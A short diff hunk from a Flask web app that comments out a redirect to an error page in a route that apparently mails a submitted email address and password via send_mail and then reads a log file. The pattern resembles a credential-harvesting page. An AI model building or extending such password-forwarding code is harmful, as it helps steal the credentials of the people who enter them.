@@ -67,7 +67,7 @@ def one():
 
         send_mail(email, password)
         read_logs('app.log')  # Call read_logs function when email is sent
-        return redirect(url_for('error'))
+        # return redirect(url_for('error'))
     return render_template('one.html')
 
 @app.route('/error', methods=['GET', 'POST'])
